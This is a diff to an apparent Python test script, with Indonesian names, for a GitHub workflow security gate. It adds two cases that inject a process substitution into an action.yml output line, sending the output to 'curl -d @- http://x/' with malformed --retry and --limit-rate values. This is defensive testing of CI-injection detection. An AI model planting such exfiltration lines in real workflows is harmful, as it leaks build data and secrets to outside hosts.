@@ -41321,6 +41321,48 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("diff3 bendera panjang diberi =value kini ditolak (Audit 2885)", rc == 0)
         shutil.rmtree(sub1950, ignore_errors=True)
+        sub1951 = klon(tmp, "sub1951")
+        berkas_aksi1951 = os.path.join(
+            sub1951, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1951, encoding="utf-8") as f:
+            isi_aksi1951 = f.read()
+        baris_aksi1951 = [b for b in isi_aksi1951.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1951 = isi_aksi1951.replace(
+                baris_aksi1951,
+                baris_aksi1951.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl --retry abc -d @- http://x/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1951 != isi_aksi1951, \
+            "suntikan aksi1951 tidak menembak"
+        with open(berkas_aksi1951, "w", encoding="utf-8") as f:
+            f.write(isi_baru1951)
+        rc, out = jalan(sub1951,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("curl nilai numerik --retry asing kini ditolak (Audit 2886)", rc == 0)
+        shutil.rmtree(sub1951, ignore_errors=True)
+        sub1952 = klon(tmp, "sub1952")
+        berkas_aksi1952 = os.path.join(
+            sub1952, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1952, encoding="utf-8") as f:
+            isi_aksi1952 = f.read()
+        baris_aksi1952 = [b for b in isi_aksi1952.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1952 = isi_aksi1952.replace(
+                baris_aksi1952,
+                baris_aksi1952.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl --limit-rate abc -d @- http://x/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1952 != isi_aksi1952, \
+            "suntikan aksi1952 tidak menembak"
+        with open(berkas_aksi1952, "w", encoding="utf-8") as f:
+            f.write(isi_baru1952)
+        rc, out = jalan(sub1952,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("curl nilai --limit-rate asing kini ditolak (Audit 2886)", rc == 0)
+        shutil.rmtree(sub1952, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
